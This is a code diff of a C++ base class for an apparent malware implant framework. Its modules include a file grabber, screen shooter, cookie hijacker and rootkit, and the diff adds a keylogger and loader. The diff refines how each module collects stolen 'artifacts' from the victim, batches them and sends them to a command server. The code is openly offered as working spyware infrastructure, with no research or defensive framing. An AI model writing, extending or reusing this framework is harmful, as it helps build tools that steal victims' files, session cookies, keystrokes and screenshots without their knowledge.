@@ -20,6 +20,8 @@ typedef enum SupportedModules {
         FILE_GRABBER=0,
         SCREEN_SHOOTER,
         COOKIE_HIJACKER,
+        KEY_LOGGER,
+        LOADER,
         ROOTKIT,
         NUM_OF_MODULES
     } supported_modules_enum;
@@ -44,9 +46,15 @@ protected:
     virtual void module_impl() = 0;
 
     /* upon artifact collection, the derived class shall call this method */
-    void save_artifact(artifact_t artifact)
+    virtual void save_artifact(artifact_t artifact)
     {
         std::cout << "Saving artifact of " << module_type << ": " << artifact.dump() << std::endl;
+
+        if(!artifact.contains(module_type))
+        {
+            throw std::runtime_error("invalid artifacts " + artifact.dump());
+        }
+
         artifacts.push_back(artifact[module_type]);
         if(artifacts.size() >= MAX_ARTIFACTS)
         {
@@ -54,20 +62,15 @@ protected:
             artifacts.swap(clone);
             send_artifacts(clone);
         }
-
-        
     }
 
     void send_artifacts(std::vector <artifact_t> artifacts)
     {
+        std::cout << "sending " << artifacts.size() << " artifacts" << std::endl;
         json artifacts_array;
         unsigned index = 0;
-        for(artifact_t a : artifacts)
+        for(const artifact_t & a : artifacts)
         {
-            // std::string base64_artifact = encode_artifacts(a);
-            // std::stringstream key;
-            // key << module_type << "_" << index;
-            // payload[key.str()] = base64_artifact;
             artifacts_array.push_back(a);
         }
 
@@ -77,7 +80,7 @@ protected:
         
         std::cout << "Sending artifacts to server: " << payload.dump() << std::endl;
 
-        Communicator::getInstance().send_artifact(payload);
+        Communicator::getInstance().send_artifact(&payload);
     }
 
     // std::string encode_artifacts(artifact_t a)
@@ -89,7 +92,6 @@ private:
     static const char * module_names[];
 
 public:
-
     const std::string & get_module_type()
     {
         return module_type;
@@ -104,6 +106,7 @@ public:
         if(args.contains("activity_id"))
         {
             activity_id = args["activity_id"];
+            args.erase("activity_id");
         }
     }
 
@@ -125,7 +128,7 @@ public:
         }
     }
     
-    void stop()
+    virtual void stop()
     {
         run_ = false;
     }
